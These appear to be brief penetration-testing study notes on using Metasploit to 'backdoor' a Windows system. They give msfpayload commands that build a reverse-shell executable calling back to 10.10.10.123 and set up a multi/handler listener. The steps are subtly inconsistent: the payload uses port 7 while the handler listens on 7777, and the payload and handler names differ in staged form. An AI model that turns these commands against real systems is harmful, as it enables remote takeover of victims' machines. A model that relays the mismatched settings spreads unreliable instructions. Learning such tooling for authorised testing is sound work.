# Exploits vs Payloads vs Vulnerabilities #

- Vulnerabilities are places where you can take advantage of an operating system

- Exploits are how you take advantage of vulnerabilities

- Payloads are what you do once the exploit has been executed (reverse-shell or netcat listener etc)

# Using Metasploit for backdooring OS #

You will need a server setup to listen for incoming connections that has Metasploit installed. Kali has it by default.

Start the metasploit console
msfconsole

Update metasploit console
msfupdate

# Binary Payloads #

Generate a binary payload instead of using netcat

msfpayload windows/shell_reverse_tcp O
-O command shows all options

# Example Output #

msfpayload windows/shell_reverse_tcp LHOST=metasploit_server_ip LPORT=listening_port_on_server

msfpayload -h
- List all available payloads

/payload/path O
- List available options for payload

/payload/path X > payload.exe
- Save payload and save it as a Windows Portable Executable

/payload/path R > payload.raw
- Raw format

/payload/path C > payload.c
- Export payload as C code

/payload/path J > payload.java
- Export code as java code

# Create a payload #

msfpayload windows/shell_reverse_tcp LHOST=10.10.10.123 LPORT=7 > /tmp/exploit.exe

file /tmp/exploit.exe
- PE32 executable (GUI) 
- File lets you verify what type of file you have on your linux system

Executes binary on target system and listens for response from binary

# Set msfconsole to listen for your binary

# Start msfconsole
- msfconsole
- use exploit/multi/handler
- set payload windows/shell/reverse_tcp
- set LHOST 10.10.10.123
- set LPORT 7777
- show options

# Run exploit
- exploit (starts listening port on metasploit systems) add it to your toolkit
